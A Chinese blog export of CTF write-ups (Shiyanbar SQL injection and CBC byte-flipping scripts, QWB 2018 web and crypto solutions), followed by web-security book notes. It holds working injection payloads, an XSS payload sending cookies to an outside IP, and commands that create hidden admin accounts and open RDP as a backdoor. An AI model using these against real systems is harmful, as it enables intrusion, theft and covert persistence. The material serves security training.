mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con){  die(&#39;Could not connect: &#39; . mysql_error());}$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);$sql=&quot;SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) {     $key = mysql_fetch_array($query);    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {        print &quot;CTF{XXXXXX}&quot;;    }else{        print &quot;亦可赛艇！&quot;;    }}else{  print &quot;一颗赛艇！&quot;;}mysql_close($con);?&gt;</code></pre><p>注意过滤了这些关键字</p><pre><code>$filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)“;</code></pre><p>要输出flag就要满足<code>mysql_num_rows($query) == 1、$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>这两个条件。</p><p>mysql_num_rows()函数返回结果集中行的数目。我们构造uname让sql语句查询出来的结果是一行就能绕过。Uname = ‘or 1 limit 1#，这样sql语句就是SELECT * FROM interest WHERE uname = ‘’or 1 limit 1#，这样就查询1行，也就能绕过第一个条件。<br>从源码分析可得，过滤了逗号，我们不能简单的使用limit 1,1这样的语法，而是可以使用limit 1 offset 1。</p><p>第二个条件是让查询的pwd的值等于输入的值，此处用的是 ==，根据弱类型，NULL和空字符串是相等的，然后就是绕过pwd了，<br>这里的思路是，利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的</p><p>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #<br>这里解释一下此时执行的SQL:<br>SELECT * FROM interest where uname=’ ‘ or 1=1<br>group by pwd with rollup （在数据库中添加一行使得pwd=NULL）<br>limit 1 （只查询一行）<br>offset 2 （从第二行开始查询）#注释<br>此时密码只要为空即可查询成功</p><p>payload:uname=’or 1 group by pwd with rollup limit 1 OFFSET 2#</p><p>flag：CTF{with_rollup_interesting}</p><h3 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h3><p>自己没做出来<br>别人的wp三种方法：<br><a href="https://www.jianshu.com/p/5d34b3722128" target="_blank" rel="external">https://www.jianshu.com/p/5d34b3722128</a></p><h3 id="登录一下好吗？？"><a href="#登录一下好吗？？" class="headerlink" title="登录一下好吗？？"></a>登录一下好吗？？</h3><p>题目地址: <a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a></p><p>在用户名表单里提交一系列字段可以发现题目过滤了几乎所有查询语句，注释，但是没有过滤’，这里的绕过比较巧妙，由于=是从左到到运算的，所以可以人为构造0=0的结果，payload为username=1’=’&amp;password=1’=’，拼接后的语句为:</p><pre><code>select * from user where username=&#39;1&#39;=&#39;&#39; and password=&#39;1&#39;=&#39;&#39;</code></pre><p>username=’1’=’’这句，先有username=’1’返回0，然后再和’’比较，mysql中的弱类型比较0和空字符串是相等的，所以能返回1，后面半句同理，所以整句能够返回1，flag为ctf{51d1bf8fb65a8c2406513ee8f52283e7}。<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011614_554.png" alt=""></p><h3 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="*你真的会PHP吗？"></a>*你真的会PHP吗？</h3><p>首先fiddler抓包，在response header中发现hint:6c525af4059b4fe7d8c33a.txt,打开后找到index.php源码<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201958_595.png" alt=""></p><pre><code>&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_POST[&#39;number&#39;])){   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);   die(&quot;have a fun!!&quot;); }foreach([$_POST] as $global_var) {     foreach($global_var as $key =&gt; $value) {         $value = trim($value);         is_string($value) &amp;&amp; $req[$key] = addslashes($value);     } } function is_palindrome_number($number) {     $number = strval($number);     $i = 0;     $j = strlen($number) - 1;     while($i &lt; $j) {         if($number[$i] !== $number[$j]) {             return false;         }         $i++;         $j--;     }     return true; } if(is_numeric($_REQUEST[&#39;number&#39;])){   $info=&quot;sorry, you cann&#39;t input a number!&quot;;}elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))){     $info = &quot;number must be equal to it&#39;s integer!! &quot;;  }else{     $value1 = intval($req[&quot;number&quot;]);     $value2 = intval(strrev($req[&quot;number&quot;]));       if($value1!=$value2){          $info=&quot;no, this is not a palindrome number!&quot;;     }else{          if(is_palindrome_number($req[&quot;number&quot;])){              $info = &quot;nice! {$value1} is a palindrome number!&quot;;           }else{             $info=$flag;          }     }}echo $info;</code></pre><p>经过审计我们可以发现如果我们要拿到flag，POST的number需要满足以下条件：<br>1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)<br>2.不能是一个回文数。（is_palindrome_number判断）<br>3.该数的反转的整数值应该和它本身的整数值相等。即：</p><p>intval($req[“number”])=intval(strrev($req[“number”]))<br>1<br>回文数就是类似于121这样的数。从上面可以看出2，3条件似乎是冲突滴！</p><p>下面给出两种解法：</p><p>1.利用intval函数溢出绕过<br>Intval函数获取变量整数值。<br>函数介绍清点这里<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件。通过把空字符可以绕过is_numeric的判断（如%00,%20）,所以我们构造以下poc，number=2147483647%00 和number=2147483647%20都可。</p><p>对于第一个条件，我们需要构造是让我们的poc被函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符和空字符。</p><p>而经过测试我发现is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！！<br><img src="http://oy0tigw51.bkt.clouddn.com/201803202002_274.png" alt=""></p><h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>首先代码审查</p><p>在查看页面源码中发现 代码泄露</p><pre><code>&lt;!-- $password=$_POST[&#39;password&#39;];    $sql = &quot;SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;    $result=mysqli_query($link,$sql);        if(mysqli_num_rows($result)&gt;0){            echo &#39;flag is :&#39;.$flag;        }        else{            echo &#39;密码错误!&#39;;        } --&gt;</code></pre><p>后台对传入的 password进行MD5加密后进行数据库 </p><p>想着怎么去构造一个MD5加密后的结果 在百度上搜了下<br>找到一个字符串  ffifdyop md5后，276f722736c95d99e921722cf9ed621c<br>再转成字符串：<code>&#39;or&#39;6&lt;trash&gt;</code><br>那整个sql变成</p><pre><code>SELECT * FROM admin WHEREusername = &#39;admin&#39; and password = &#39;&#39;or&#39;6&lt;trash&gt;&#39;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201804011637_720.png" alt=""></p><h3 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h3><p>这题名字叫简单的登录题，实际上一点都不算简单，要认真写一个writeup确实很费劲，但pcat还是写了一篇过得去的。</p><p>1.做题的初步收集、整理<br>index.php是一个普通的登录框，输入id来登录，我们用burpsuite抓下包，并使用Repeater功能。<br>1) 当post id时候，返回包Set-cookie里包含iv和cipher，这2个英文单词玩密码学就很容易理解，iv就是Initialization Vector(初始化向量)，cipher就是密文</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804011324_762.png" alt=""><br>注意这里有个提示：test.php<br>登录得到<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011334_838.png" alt=""><br>查看源码得到<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011335_302.png" alt=""><br>源码过滤|-|#|=|~|union|like|procedure这些语句</p><p>2) 使用Repeater功能不断的发送相同的包，返回的iv和cipher都不一样，基本断定每次的iv值是随机生成，另外iv和cipher的格式都是先base64编码后再进行urlencode编码。这里逻辑几句，不少人总看到base64解码后的字符是乱码后，就问该怎么解密之类的话，其实不要搞混了，base64不是一种加密方式，只是一种编码方式，base64编码后可以让不可视字符可视化（这才是最大的作用），而不起任何加密作用。<br>3) 把iv值经过urldecode再base64解码后用len()得到长度为16，基本猜测算法是aes，而且大胆猜测是aes的cbc模式<br>4) 从id=1入手，发现有#和-都会被waf检测到<br>5) 当cookies里有iv值和cipher值，然后不提交任何参数（包括id），就会显示Hello，猜测是根据传入的iv和cipher来解码后，再参与内部的sql查询出用户名<br>6) 由于aes的key值不知道，我就觉得这题比较难做了，然后先按照web题的基本思路———扫描，打开御剑扫一下，幸运的发现test.php泄露了源码。整理下源码中的逻辑：<br> <em>1 若是post id，就先进行waf检测，检测过了才随机生成iv值，并且对array(‘id’=&gt;$id)进行php的序列化操作，再进行aes加密，再分别对iv和cipher进行base64编码并设置到cookies </em>2 如果cookies里有iv和cipher，就对其base64解码，然后对其aes解密，再进行php反序列化，如果不能反序列化则返回解密后的明文的base64编码，如果可以则进行sql语句拼接，查询若是行数&gt;0就显示其username列的值，否则都是Hello!<br> <em>3 难点1，过滤了#-=,还有union和procedure </em>4 难点2，注入点在limit后面，而且后面还是”,0”，0本来就是让limit取出0行，而前面的逗号更是难弄掉<br> *5 aes的加密模式aes-128-cbc<br>7) mysql语法，limit后面只能procedure还有for update，还有尝试了堆叠注入，也是不行。<br>8) 本题算比较好点，mysql会显示错误信息，这就可以弄报错注入（当前是得有前提的）</p><p>2.构建能绕过过滤的payload<br>尝试了很多，发现post id=1;%00（这里关键是;%00）可以绕过去，然后登录后会显示Hello!rootzz，说明user表里的值是rootzz，而并不是我们所期待的flag值（如果那么简单就好了- -）<br>关键的关键字都被过滤，这可怎么办？<br>这时候要冷静分析下。<br>1) 直接post id时候是有过滤<br>2) 在cookies解密出来是没有过滤，就直接拼接sql语句<br>于是我们可以大胆猜测，修改cookies的值来达到解密后的明文可以构造sql注入。</p><p>这并不是无的放矢，在密码学里是可以做到的</p><p>3.aes的cbc byte flipping attack（cbc字节翻转攻击）<br>先放出参考文章，自己可以多去阅读<br>推荐英文文章：<br><a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/" target="_blank" rel="external">http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/</a><br>以下是中文译文（其中图片挂了，结合英文版就没问题）：</p><pre><code>http://wps2015.org/drops/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html=======</code></pre><p>cbc字节翻转攻击，我就不叙述原理，我直接演示一个简单的操作：<br>把id=12的密文修改后解析为id=1#</p><p>这里因为序列化是php的，我先写了一个php文件，便于显示</p><pre><code>&lt;?php$id=@$_POST[&#39;id&#39;];$info = array(&#39;id&#39;=&gt;$id);$plain = serialize($info);$row=ceil(strlen($plain)/16);for($i=0;$i&lt;$row;$i++){    echo substr($plain,$i*16,16).&#39;&lt;br/&gt;&#39;;}</code></pre><p>当post id=12时候，显示<br>a:1:{s:2:”id”;s:<br>2:”12”;}<br>每一行16个字节，这里12的2对应上一行{的偏离量是4<br>有这个准备后，<br>在原题里post id=12，得到下面（这只是示例）<br>iv=ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D<br>cipher=U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D</p><p>运行以下脚本</p><pre><code># -*- coding:utf8 -*-__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibcipher=&#39;U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D&#39;cipher_raw=b64decode(urllib.unquote(cipher))lst=list(cipher_raw)idx=4c1=&#39;2&#39;c2=&#39;#&#39;lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))cipher_new=&#39;&#39;.join(lst)cipher_new=urllib.quote(b64encode(cipher_new))print cipher_new</code></pre><p>得到cipher_new<br>U9qq55BOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D<br>再用之前的iv一起去访问，得到<br>base64_decode(‘g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9’) can’t unserialize<br>这是因为iv值没修改，导致无法反序列化</p><p>运行以下脚本</p><pre><code># -*- coding:utf8 -*-__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibiv=&#39;ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D&#39;iv_raw=b64decode(urllib.unquote(iv))first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;plain=b64decode(&#39;g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9&#39;)iv_new=&#39;&#39;for i in range(16):    iv_new+=chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))iv_new=urllib.quote(b64encode(iv_new))print iv_new</code></pre><p>得到iv_new<br>hHlJ4xkEBvpldXUI0wqnNA%3D%3D<br>再跟之前的cipher_new，一起去访问，得到<br>Hello!rootzz<br>也就是id=12顺利变成了id=1#注入成功。</p><p>离成功就差一步了，<br>1) 把上面的过程编写成脚本<br>2) 尽可能只翻转一个字节，例如把2nion翻转为union，末尾再用;%00来注释掉后面<br>3) 由于逗号被过滤，用join来代替；等号被过滤，用regexp来代替</p><p>以下是pcat的脚本：</p><pre><code># -*- coding:utf8 -*-# 请保留我的个人信息，谢谢~！__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibimport requestsimport redef mydecode(value):    return b64decode(urllib.unquote(value))def myencode(value):    return urllib.quote(b64encode(value))def mycbc(value,idx,c1,c2):    lst=list(value)    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))    return &#39;&#39;.join(lst)def pcat(payload,idx,c1,c2):    url=r&#39;http://ctf5.shiyanbar.com/web/jiandan/index.php&#39;    myd={&#39;id&#39;:payload}    res=requests.post(url,data=myd)    cookies=res.headers[&#39;Set-Cookie&#39;]    iv=re.findall(r&#39;iv=(.*?),&#39;,cookies)[0]    cipher=re.findall(r&#39;cipher=(.*)&#39;,cookies)[0]    iv_raw=mydecode(iv)    cipher_raw=mydecode(cipher)    cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))    cookies_new={&#39;iv&#39;:iv,&#39;cipher&#39;:cipher_new}    cont=requests.get(url,cookies=cookies_new).content    plain=b64decode(re.findall(r&quot;base64_decode\(&#39;(.*?)&#39;\)&quot;,cont)[0])    first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;    iv_new=&#39;&#39;    for i in range(16):        iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))    iv_new=myencode(iv_new)    cookies_new={&#39;iv&#39;:iv_new,&#39;cipher&#39;:cipher_new}    cont=requests.get(url,cookies=cookies_new).content    print &#39;Payload:%s\n&gt;&gt; &#39; %(payload)    print cont    passdef foo():    pcat(&#39;12&#39;,4,&#39;2&#39;,&#39;#&#39;)    pcat(&#39;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&#39;+chr(0),6,&#39;2&#39;,&#39;u&#39;)    pcat(&#39;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&#39;+chr(0),7,&#39;2&#39;,&#39;u&#39;)    pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &#39;you_want&#39;)b join (select 3)c);&quot;+chr(0),7,&#39;2&#39;,&#39;u&#39;)    pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0),6,&#39;2&#39;,&#39;u&#39;)    passif __name__ == &#39;__main__&#39;:    foo()    print &#39;ok&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第二届强网杯-部分wp</title>
      <link href="/archives/2ccf6cb2/"/>
      <url>/archives/2ccf6cb2/</url>
      
        <content type="html"><![CDATA[<p>#第二届强网杯-部分wp</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>flag{welcome_to_qwb}</p><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><blockquote><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p></blockquote><p>第一关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252209_432.png" alt=""><br>这个就是标准的弱类型了<br>取md5之后为0e开头的字符串，如<br>param1=240610708<br>param2=s878926199a<br>第二关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252216_349.jpg" alt=""><br>考察php的弱类型和数组绕过基础，都是恨经典的题<br>这道题不能用弱类型绕过，但是可以用数组导致md5()函数报错返回空，空===空符合条件，得到Flag。<br>param1[]=1&amp;param2[]=2<br>第三关<br>这道题可以用hash碰撞解决，字符串：</p><pre><code>param1=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Apparam2=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803252223_324.png" alt=""></p><blockquote><p>另外还有一种方式可以把三关过掉就是使用md5碰撞</p></blockquote><pre><code>param1=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0Aj%18%B5%C3Q%0C%9A%82%CE%27%A4Cf%40%B1%FC%D6%DC%8D%DF%05%EB%B9%DF%5B%18%88%D4%A6%05%956%BC%EC-%3E%90%0F%26%FA%2C%AA%21%25%20g%A7%DB%EA%DB%89%05%A7%07%0D%14dS%20S%FB%90%B5%8A%C4T%E5%B2L%20%95%1C6%CD%17N%CE-%80%7B%9C%1E%8DN%26%1A%3A%11%BA%9E%B4%11%BD%04%99%0F%E1%9D%C4%D3%E2%D8%9E%B8%E6%7F%B3%E9%06&amp;param2=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0A%EA%18%B5%C3Q%0C%9A%82%CE%27%A4Cf</code></pre><p>##welcome<br>改名.jpg<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260100_207.png" alt=""><br>放入stegsolve<br>stereogram slover移位操作<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260104_53.png" alt=""><br>offset 80</p><h2 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201803261418_523.png" alt=""><br>发现js有rpo漏洞，其中内容可由编写的文章成为js。<br>参考文章：blog.nsfocus.net/rpo-attack/<br><a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p><p><a href="http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f" target="_blank" rel="external">http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f</a></p><p>提示是Try to get the cookie of path “/QWB_fl4g/QWB/”获取目录下的cookie<br>所以先获取了一下cookie，发现没有flag</p><pre><code>b=document.cookie;a=&quot;&lt;img src=//115.29.36.83:23338/&quot;+btoa(b)+&quot;&gt;&quot;;document.write(a);</code></pre><p>但是有提示是Try to get the cookie of path “/QWB_fl4g/QWB/“</p><p>那就是获取目录下的cookie</p><pre><code>var i = document.createElement(&quot;iframe&quot;);i.setAttribute(&quot;src&quot;, &quot;/QWB_fl4g/QWB/&quot;);document.body.appendChild(i);i.addEventListener( &quot;load&quot;, function(){  var content = i.contentWindow.document.cookie;  location=&#39;//115.29.36.83:23338/&#39;+btoa(content);}, false);</code></pre><p>再利用eval包含住String.fromCharCode即可，payload长度还有些限制。</p><p>QWB{flag_is_f43kth4rpo}</p><h2 id="streamgame1"><a href="#streamgame1" class="headerlink" title="streamgame1"></a>streamgame1</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>发现可以爆破<br>所以写如下脚本</p><pre><code>python# coding=utf-8  def lfsr(R, mask):      output = (R &lt;&lt; 1) &amp; 0xffffff    i = (R &amp; mask) &amp; 0xffffff    lastbit = 0     while i != 0:          lastbit ^= (i &amp; 1)          i = i &gt;&gt; 1    output ^= lastbit      return (output, lastbit)  def main1(flag):      R = flag     mask = 0b1010011000100011100    f = open(&quot;key1&quot;, &quot;wb&quot;)      for i in range(12):    tmp = 0     for j in range(8):              (R, out) = lfsr(R, mask)              tmp = (tmp &lt;&lt; 1) ^ out          f.write(chr(tmp))      f.close()  key = open(&#39;key&#39;, &#39;rb&#39;)  key1 = key.read()  for x in range(524288, -1, -1):      main1(x)      key2 = open(&#39;key1&#39;, &#39;rb&#39;)      result = key2.read()      if (result == key1):          print x          break     key2.close()</code></pre><p>爆破得到<br>481387<br><code>flag{1110101100001101011}</code></p><h2 id="streamgame2"><a href="#streamgame2" class="headerlink" title="streamgame2"></a>streamgame2</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>与上一道题相似脚本如下</p><pre><code>python# coding=utf-8  def lfsr(R, mask):      output = (R &lt;&lt; 1) &amp; 0xffffff     i = (R &amp; mask) &amp; 0xffffff     lastbit = 0     while i != 0:          lastbit ^= (i &amp; 1)          i = i &gt;&gt; 1     output ^= lastbit      return (output, lastbit)  def main1(flag):      R = flag      mask = 0x100002     f = open(&quot;key1&quot;, &quot;wb&quot;)      for i in range(12):          tmp = 0     for j in range(8):              (R, out) = lfsr(R, mask)              tmp = (tmp &lt;&lt; 1) ^ out          f.write(chr(tmp))      f.close()  key = open(&#39;key&#39;, &#39;rb&#39;)  key1 = key.read()  for x in range(0b111111111111111111111 \+ 1, -1, -1):      main1(x)      key2 = open(&#39;key1&#39;, &#39;rb&#39;)      result = key2.read()      if (result == key1):          print x          break     key2.close()</code></pre><p>flag{110111100101001101001}</p><h2 id="Three-hit-Web"><a href="#Three-hit-Web" class="headerlink" title="Three hit    Web"></a>Three hit    Web</h2><p>注册将用户名，密码，年龄写入数据库，登录过后将年龄显示出来<br>思路：每次注册一个用户，注入点放进age，登录查看</p><p>注册提交age显示只能为数字，age用16进制提交，16进制提交不会对%23url解码，所以用–代替</p><p>payload:</p><pre><code>username=Str3am1&amp;age=0x2d3636363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c322c332c34206c696d697420312c312d2d&amp;password=1</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/j0mydok06kpm0m5gailch3p9l7.png" alt=""></p><p>因为每次都会将年龄写入数据库里面，所以每次都需要修改年龄的值</p><pre><code>username=Str3am11&amp;age=0x2d36363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167292c332c34206c696d697420312c312d2d&amp;password=1</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/72x5eade9sy8pewomdvy5w0yq4.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>黑客攻防web安全实战详解</title>
      <link href="/archives/2ab3b8ea/"/>
      <url>/archives/2ab3b8ea/</url>
      
        <content type="html"><![CDATA[<h1 id="黑客攻防web安全实战详解"><a href="#黑客攻防web安全实战详解" class="headerlink" title="黑客攻防web安全实战详解"></a>黑客攻防web安全实战详解</h1><p><img src="http://oy0tigw51.bkt.clouddn.com/201801051020_332.png" alt=""></p><h2 id="第一章：网络基础"><a href="#第一章：网络基础" class="headerlink" title="第一章：网络基础"></a>第一章：网络基础</h2><p>###计算机网络<br>IP协议和TCP/IP模型<br>ip地址一般为点分十进制，4段，例如192.168.1.1<br>cmd——&gt;ipconfig 查询本机ip地址</p><p>###端口<br>范围在0-65535<br>21端口：FTP服务<br>23端口：Telnet（远程登录）服务<br>25：SMTP发送邮件<br>80：HTTP<br>109、110：POP2，POP3.<br>135：RPC<br>137：NetBIOS<br>3389：远程桌面服务端口<br>5632：远程软件<br>8080：同80用于WWW代理服务</p><p>cmd——&gt;netstat -on可查看本机开放的端口</p><p>Web服务3种协议<br>HTTP-GET 和    HTTP-POST SOAP(XML web service最常用到的) </p><h2 id="第二章：信息搜索与社会工程"><a href="#第二章：信息搜索与社会工程" class="headerlink" title="第二章：信息搜索与社会工程"></a>第二章：信息搜索与社会工程</h2><p>whois查询域名的ip和所有者信息的传输协议<br>SEO综合查询  <a href="http://tool.chinaz.com/" target="_blank" rel="external">站长工具</a></p><h3 id="常见的端口扫描技术："><a href="#常见的端口扫描技术：" class="headerlink" title="常见的端口扫描技术："></a>常见的端口扫描技术：</h3><p>TCP connect()扫描<br>TCP SYN 扫描<br>TCP FIN扫描<br>实战端口扫描</p><ol><li><a href="http://tool.chinaz.com/port" target="_blank" rel="external">站长工具</a></li><li>scanport</li></ol><h3 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h3><p>1.wwwscan<br>2.御剑<br>3.safe3wvs</p><h3 id="web漏洞扫描"><a href="#web漏洞扫描" class="headerlink" title="web漏洞扫描"></a>web漏洞扫描</h3><p>1.APPscan<br>2.x-scan<br>3.nessus<br>4.在线扫描工具scanv<br>5.jsky<br>6.Awvs<br>7.webcruiser</p><h3 id="Googlehack"><a href="#Googlehack" class="headerlink" title="Googlehack"></a>Googlehack</h3><p>www.google.com/intl/xx-hacker 黑客专用入口<br>www.google.com/custom?hl=zh-CN 中文黑客专用信息和资料搜索地址<br>www.google.com/custom?hl=en 英文黑客专用信息和资料搜索地址</p><p>intext或allintext 搜索网站正文<br>intitle或allintitle 搜索网站标题<br>cache搜索缓存内容<br>define 查找关键字的定义<br>filetype：文件名.后缀名   例如：信息安全论文 filetype:doc<br>info搜索网站基本信息<br>inurl或allinurl</p><blockquote><p>inurl: admin/login.asp site:www.sina.con<br>就会搜索这个网站下的包含 admin/login.sap的链接<br>inurl:php?id=    搜索包含:php?id=的链接</p></blockquote><p>intitle 网站标题中包含了查询关键词的网页</p><blockquote><p>[攻防 intitle：实战]</p></blockquote><p>site 指定搜索一个站<br>intext 网站正文</p><blockquote><p>site:xx.com intext:管理<br> site:xx.com intext:manage<br>  site:xx.com intext:admin<br>  site:xx.com intitle:后台<br>   site:xx.com inurl:admin</p></blockquote><p>搜索网站目录<br>index<br>转到父目录<br>to parent directory</p><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><p>一切利用人自身漏洞的行为都属于社会工程学范畴</p><h3 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h3><p>net user test1 123 /add<br>其中test1 为用户名 123为密码</p><p>开启3389端口<br>“REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal””Server /v fDenyTSConnections /t REG_DWORD /d 0 /f”<br>提升用户权限：”net localgroup administrators test1 /add”<br>分别执行这两条命令，或者使用开启3389服务工具</p><h4 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h4><p>方法一：安装远控程序<br>方法二：建立隐蔽的用户，并将远程连接端口3389改为其他端口。<br>在建立用户帐户时，如果在用户名后面加上$符号，就可以建立一个简单的隐藏帐户，如“test$”。<br>在字符界面下执行net user命令，就无法查看到这个帐户，但是在图形界面的“本地用户和组”中仍然可以看到。在入侵了一台主机之后，一般都要想办法给自己留一个后门，而给自己加一个管理员组的帐户则是常用的手法。由于带“$”的帐户容易被发现，于是一些人就在帐户的显示名称上下功夫，建立一个看起来和系统帐户类似的名字来迷惑管理员，如admin、sysadmin、Billgates、root等。</p><pre><code>net user chun$ password /add net localgroup administrators chun$ /add 这样我们就利用“命令提示符”成功得建立了一个用户名为“chun$”，密码为“password”的简单“隐藏账户”，并且把该隐藏账户提升为了管理员权限</code></pre><p>方法三：<br>开始 –&gt; 运行 –&gt; regedit –&gt; 确定<br>依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp<br>分支，其下的”PortNumber”键值所对应的就是端口号，将其修改即可。上面设置完成后，需要再依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal 